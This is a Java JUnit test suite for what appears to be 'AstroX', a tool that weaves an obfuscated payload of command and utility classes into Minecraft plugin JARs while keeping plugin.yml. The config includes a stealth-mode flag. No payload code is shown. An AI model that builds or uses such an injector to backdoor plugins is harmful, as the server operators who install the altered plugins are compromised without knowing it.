package dev.naruto.astrox;

import dev.naruto.astrox.core.*;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.io.TempDir;

import java.io.File;
import java.nio.file.Path;
import java.util.jar.JarFile;

import static org.junit.jupiter.api.Assertions.*;

/**
 * Integration tests for the injection pipeline.
 * Builds a real dummy plugin JAR, injects it, and verifies the output.
 */
class PayloadWeaverTest {

    @TempDir
    Path tempDir;

    private File dummyPluginJar;

    @BeforeEach
    void setUp() throws Exception {
        dummyPluginJar = tempDir.resolve("TestPlugin.jar").toFile();
        TestUtils.createDummyPluginJar(dummyPluginJar, "TestPlugin",
                "com.test.TestPlugin", "1.0");

        // Set required config
        Config.setMasterKey("test-key-12345");
        Config.regenerateEncryptionKey();
        RuntimeConfig.dryRun = false;
        RuntimeConfig.stealthMode = false;
    }

    @Test
    @DisplayName("Injection should produce a valid output JAR")
    void testInjectProducesOutputJar() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, false, false);
        PipelineResult result = injector.inject(analyzer, payload);

        assertTrue(outputJar.exists(), "Output JAR should exist");
        assertTrue(outputJar.length() > dummyPluginJar.length(),
                "Output JAR should be larger than input (injected classes)");
        assertFalse(result.dryRun());
        assertFalse(result.injectedClasses().isEmpty(),
                "Should have injected at least one class");
    }

    @Test
    @DisplayName("Output JAR should preserve plugin.yml")
    void testInjectedJarPreservesPluginYml() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, false, false);
        injector.inject(analyzer, payload);

        try (JarFile jar = new JarFile(outputJar)) {
            assertNotNull(jar.getJarEntry("plugin.yml"),
                    "Output JAR should contain plugin.yml");
        }
    }

    @Test
    @DisplayName("Output JAR should contain remapped payload classes")
    void testInjectedJarContainsPayloadClasses() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, false, false);
        PipelineResult result = injector.inject(analyzer, payload);

        try (JarFile jar = new JarFile(outputJar)) {
            // At least some injected classes should be present
            boolean hasPayloadEntries = jar.stream()
                    .anyMatch(e -> e.getName().endsWith(".class")
                            && !e.getName().equals("com/test/TestPlugin.class"));
            assertTrue(hasPayloadEntries, "Output JAR should contain injected payload classes");
        }

        // PipelineResult should list injected classes
        assertTrue(result.injectedClasses().size() > 10,
                "Should inject multiple classes (commands, utils, core)");
    }

    @Test
    @DisplayName("Dry-run should not produce output file")
    void testDryRunProducesNoOutput() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, true, false);
        PipelineResult result = injector.inject(analyzer, payload);

        assertFalse(outputJar.exists(), "Dry-run should not create output file");
        assertTrue(result.dryRun());
        assertFalse(result.injectedClasses().isEmpty(),
                "Dry-run should still list what would be injected");
    }

    @Test
    @DisplayName("PipelineResult should have correct analysis data")
    void testPipelineResultAnalysis() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, true, false);
        PipelineResult result = injector.inject(analyzer, payload);

        assertEquals("TestPlugin", result.analysis().pluginName());
        assertEquals("1.0", result.analysis().version());
        assertEquals("com.test.TestPlugin", result.analysis().mainClass());
        assertEquals("com.test", result.analysis().basePackage());
        assertTrue(result.durationMs() >= 0);
    }

    @Test
    @DisplayName("PipelineResult should serialize to valid JSON")
    void testPipelineResultJson() throws Exception {
        File outputJar = tempDir.resolve("TestPlugin-astrox.jar").toFile();

        JarAnalyzer analyzer = new JarAnalyzer(dummyPluginJar);
        analyzer.analyze();

        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
        byte[] payload = weaver.generatePayload();

        Injector injector = new Injector(dummyPluginJar, outputJar, true, false);
        PipelineResult result = injector.inject(analyzer, payload);

        String json = result.toJson();
        assertNotNull(json);
        assertTrue(json.contains("TestPlugin"));
        assertTrue(json.contains("com.test.TestPlugin"));
        assertTrue(json.contains("injectedClasses"));
    }
}
